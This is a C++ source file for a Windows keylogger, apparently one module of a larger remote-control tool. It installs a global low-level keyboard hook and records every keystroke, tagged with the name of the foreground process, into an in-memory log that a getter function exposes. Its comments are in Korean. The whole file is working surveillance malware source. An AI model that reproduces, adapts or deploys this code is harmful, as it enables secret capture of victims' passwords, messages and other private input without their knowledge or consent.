#include "keyLogger.h"
#include "commandManager.h"
#include <Psapi.h>
#include <tchar.h>
#include <map>

std::string keyLogger::keyLog = "";
DWORD keyLogger::prevPID = 0;
std::map<int, std::string> keyLogger::virtualKeyDict = {};

keyLogger::keyLogger()
{

}

// setting virtual key
void keyLogger::initializeKeyDict()
{
	virtualKeyDict.insert({VK_SHIFT, "[SHIFT]" });
	virtualKeyDict.insert({ VK_LSHIFT,	"[LSHIFT]" });
	virtualKeyDict.insert({ VK_RSHIFT,	"[RSHIFT]" });
	virtualKeyDict.insert({ VK_CONTROL,	"[CONTROL]" });
	virtualKeyDict.insert({ VK_LCONTROL,	"[LCONTROL]" });
	virtualKeyDict.insert({ VK_RCONTROL,	"[RCONTROL]" });
	virtualKeyDict.insert({ VK_MENU,	"[ALT]" });
	virtualKeyDict.insert({ VK_LMENU,	"[ALT]" });
	virtualKeyDict.insert({ VK_BACK , "[Backspace]" });
	virtualKeyDict.insert({ VK_SPACE , " " });
	virtualKeyDict.insert({ VK_RETURN , "[Enter]\n" });
	virtualKeyDict.insert({ VK_BACK , "[Backspace]" });
	virtualKeyDict.insert({ VK_TAB , "[TAB]" });
	virtualKeyDict.insert({ VK_ESCAPE , "[ESC]" });
	virtualKeyDict.insert({ VK_DELETE , "[DELETE]" });
	virtualKeyDict.insert({ VK_PRIOR , "[PAGE UP]" });
	virtualKeyDict.insert({ VK_NEXT , "[PAGE DOWN]" });
	virtualKeyDict.insert({ VK_CAPITAL , "[CAPS LOCK]" });
	virtualKeyDict.insert({ VK_LWIN , "[LWIN]" });
	virtualKeyDict.insert({ VK_RWIN , "[RWIN]" });
	virtualKeyDict.insert({ VK_LEFT , "[LEFT ARROW]" });
	virtualKeyDict.insert({ VK_RIGHT , "[RIGHT ARROW]" });
	virtualKeyDict.insert({ VK_UP , "[UP ARROW]" });
	virtualKeyDict.insert({ VK_DOWN , "[DOWN ARROW]" });
	virtualKeyDict.insert({ VK_OEM_PERIOD , "." });
	virtualKeyDict.insert({ VK_DECIMAL , "." });
	virtualKeyDict.insert({ VK_OEM_PLUS , "[+]" });
	virtualKeyDict.insert({ VK_OEM_MINUS , "[-]" });
	virtualKeyDict.insert({ VK_ADD , "[+]" });
	virtualKeyDict.insert({ VK_HOME , "[HOME]" });
	virtualKeyDict.insert({ VK_END , "[END]" });
	virtualKeyDict.insert({ VK_F1 , "[F1]" });
	virtualKeyDict.insert({ VK_F2 , "[F2]" });
	virtualKeyDict.insert({ VK_F3 , "[F3]" });
	virtualKeyDict.insert({ VK_F4 , "[F4]" });
	virtualKeyDict.insert({ VK_F5 , "[F5]" });
	virtualKeyDict.insert({ VK_F6 , "[F6]" });
	virtualKeyDict.insert({ VK_F7 , "[F7]" });
	virtualKeyDict.insert({ VK_F8 , "[F8]" });
	virtualKeyDict.insert({ VK_F9 , "[F9]" });
	virtualKeyDict.insert({ VK_F10 , "[F10]" });
	virtualKeyDict.insert({ VK_F11 , "[F11]" });
	virtualKeyDict.insert({ VK_F12 , "[F12]" });
	virtualKeyDict.insert({ VK_HANGUL , "[USE HANGUL]" });
	virtualKeyDict.insert({ 191 , "/" });
	virtualKeyDict.insert({ 222 , "'"});
	virtualKeyDict.insert({ 186 , ";"});
	virtualKeyDict.insert({ 188 , ","});
	virtualKeyDict.insert({ 219 , "["});
	virtualKeyDict.insert({ 220 , "\\"});
	virtualKeyDict.insert({ 221 , "]"});
	virtualKeyDict.insert({ 192 , "`"});
}

// make hook
void keyLogger::startHook()
{
	keyLogger::initializeKeyDict();

	HMODULE hModule = GetModuleHandle(NULL);
	keyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, hModule, NULL);

	MSG msg;
	GetMessage(&msg, NULL, NULL, NULL);
}

std::string keyLogger::getKeyLog()
{
	return keyLogger::keyLog;
}

void keyLogger::clearLog()
{
	keyLogger::prevPID = 0;
	keyLogger::keyLog = "";
}

// Hooking function
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((WM_KEYDOWN == wParam) || (WM_SYSKEYDOWN == wParam))
	{	
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;

		makeKeyLog(pKey->vkCode, 0);
	}
	return CallNextHookEx(keyHook, nCode, wParam, lParam);
}

/*
	키 코드에 해당하는 키 네임을 찾고 로깅
*/
void makeKeyLog(int keyCode, int statusFlag)
{
	std::string logMessage = "";
	std::string keyName = "";

	HWND foregroundHandle = GetForegroundWindow();
	DWORD pid;

	// 400MB가 넘어가면 메모리를 위해 초기화
	if (keyLogger::keyLog.length() > 400000000)
	{
		keyLogger logger;
		logger.clearLog();
	}
		

	if (foregroundHandle != NULL)
	{
		GetWindowThreadProcessId(foregroundHandle, &pid);

		if (pid != keyLogger::prevPID)
		{
			keyLogger::prevPID = pid;

			commandManager cm;

			std::wstring wName = cm.pidToName(pid);
			std::string name;
			name.assign(wName.begin(), wName.end());

			if(keyLogger::prevPID != 0)
				logMessage = "\n\n<" + name + ">\n";
		}
	}

	// 키에 해당하는 키 네임을 찾는 루틴
	if (0x00 < keyCode && (0x2F >= keyCode || keyCode >= 0x5B)) {
		for (auto virtualKey : keyLogger::virtualKeyDict) {
			if (keyCode == virtualKey.first) {
				keyName = virtualKey.second;
				break;
			}
		}
	}
	else
		keyName.push_back(((char)keyCode));


	if (keyName == "")
		return;

	logMessage.append(keyName);

	keyLogger::keyLog.append(logMessage);
}